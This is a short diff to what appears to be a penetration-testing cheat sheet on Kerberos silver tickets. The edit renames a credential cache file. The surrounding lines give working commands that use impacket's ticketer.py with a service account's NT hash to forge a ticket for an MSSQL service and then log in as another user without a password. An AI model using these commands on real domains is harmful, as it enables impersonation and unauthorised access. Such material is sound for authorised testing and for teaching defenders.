@@ -83,7 +83,7 @@ If you have the plaintext password or the NT hash of a service account, you can 
 ### Linux
 ```
 ticketer.py -nthash 077CCCC23F8AB7031BEEFB70C694A49 -domain-sid S-1-5-21-875478684-1579768486-654964636 -domain dumpsterfire.local -spn MSSQLSvc/server.dumpsterfire.local:SQLINSTANCE1 targetuser
-export KRB5CCNAME=/home/kali/mikkorantanen.ccache
+export KRB5CCNAME=/home/kali/targetuser.ccache
 ```
 Use with e.g.:
 `mssqlclient.py dumpsterfire.local/targetuser@server.dumpsterfire.local -k -no-pass`
